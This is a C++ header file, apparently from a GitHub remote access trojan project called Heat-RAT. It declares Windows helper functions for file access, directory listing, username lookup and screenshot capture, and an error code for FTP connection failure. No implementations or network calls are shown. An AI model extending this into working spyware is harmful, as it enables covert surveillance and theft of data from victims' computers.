/*
##########################################################################################################################
|....######....##.............######.....###...............####################.............######......###..............|
|....######....##.............#####.......##...............#.######.######.####..............#####.......##..............|
|..............##.....############.........######....#####.....##.....##.....##....#####.....####.........######....#####|
|..............##.............###.....#.....#####.....####.....##.....##.....##.............####.....#....######....#####|
|..............##.............###............####.....#########################...........#####............#####....#####|
|....######....##.....##########..............###.....########################....##.......##..............#####....#####|
|....#####.....##..............................##.....####.....##.....##.....##....####......................###....#####|
|....######....##..................#######.....##.....####.....##.....##.....##....#####..........#######....###....#####|
|                                                    by: Nick_Vinesmoke                                                  |
|                                             https://github.com/Nick-Vinesmoke                                          |
|                                        https://github.com/Nick-Vinesmoke/Heat-RAT                                      |
##########################################################################################################################
*/

#pragma once

#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <fstream>
#include <filesystem>
#include <iomanip>
#include <ctime>
#include <sstream>
#include <gdiplus.h>
#include <gdiplusbitmap.h>
#include <gdiplusbase.h>

using namespace Gdiplus;

#pragma comment (lib,"gdiplus.lib")

/**
 * @brief Enumerates error codes for WinApi operations.
 *
 * The ErrorCodes enum class defines specific error codes that may occur during
 * WinApi operations. Each error code corresponds to a particular type of error.
 */
enum class ErrorCodes
{
    /**
     * @brief Error code indicating a failure to create a directory.
     */
    MKDIR_ERROR = 0,

    /**
     * @brief Error code indicating a failure related to file operations.
     */
    FILE_ERROR = 1,

    /**
     * @brief Error code indicating an internal error within the WinApi operations.
     */
    INTERNAL_ERROR = 2,

    /**
     * @brief Error code indicating a failure to connect to an FTP server.
     */
    FTP_CONNECT_ERROR = 3
};


/**
 * @brief Provides a set of static utility functions related to Windows API.
 *
 * The WinApi class encapsulates various static methods for common Windows API operations,
 * including file I/O, path manipulation, error handling, directory listing, screenshot capture,
 * and other miscellaneous tasks.
 */
class WinApi
{
public:
    /**
     * @brief Default constructor for WinApi class.
     */
    WinApi() = default;

    /**
     * @brief Default destructor for WinApi class.
     */
    ~WinApi() = default;

    /**
     * @brief Reads the content of a file and returns it as a string.
     *
     * @param file_path The path of the file to be read.
     * @return The content of the file as a string.
     */
    static std::string read_file(const std::string& file_path);

    /**
     * @brief Writes content to a file.
     *
     * @param file_path The path of the file to be written.
     * @param content The content to be written to the file.
     */
    static void write_file(const std::string& file_path, const std::string& content);

    /**
     * @brief Checks if a path exists.
     *
     * @param path The path to be checked.
     * @return True if the path exists; otherwise, false.
     */
    static bool path_exists(const std::string& path);

    /**
     * @brief Retrieves the username associated with the current Windows session.
     *
     * @return The username as a string.
     */
    static std::string get_username();

    /**
     * @brief Converts the last WinAPI error code to a string representation.
     *
     * @return The error message as a string.
     */
    static std::string last_error_as_string();

    /**
     * @brief Lists the files and directories in a specified directory.
     *
     * @param path The path of the directory to be listed.
     * @return A vector of strings representing the contents of the directory.
     */
    static std::vector<std::string> listdir(const std::string& path);

    /**
     * @brief Captures a screenshot and saves it to the specified path.
     *
     * @param path The path where the screenshot will be saved.
     * @return The path of the saved screenshot.
     */
    static std::string screenshot(const std::string& path);

    /**
     * @brief Generates a random string.
     *
     * @return A randomly generated string.
     */
    static std::string random_string();

    /**
     * @brief Gets the current date as a string.
     *
     * @return The current date as a string.
     */
    static std::string get_date();

    /**
     * @brief Creates a bitmap header with the specified width and height.
     *
     * @param width The width of the bitmap.
     * @param height The height of the bitmap.
     * @return The created BITMAPINFOHEADER.
     */
    static BITMAPINFOHEADER createBitmapHeader(int width, int height);

    /**
     * @brief Captures the screen using GdiPlus and returns the captured image as an HBITMAP.
     *
     * @param hWnd The handle to the window whose content will be captured.
     * @return The captured screen as an HBITMAP.
     */
    static HBITMAP GdiPlusScreenCapture(HWND hWnd);

    /**
     * @brief Saves the provided HBITMAP to memory in the specified data format.
     *
     * @param hbitmap The HBITMAP to be saved.
     * @param data A vector to store the image data.
     * @param dataFormat The format in which the image data should be saved (default is "png").
     * @return True if saving to memory is successful; otherwise, false.
     */
    static bool saveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::string dataFormat = "png");

    /**
     * @brief Appends content to an existing file.
     *
     * @param file_path The path of the file to which content will be appended.
     * @param content The content to be appended to the file.
     */
    static void append_file(const std::string& file_path, const std::string& content);
};
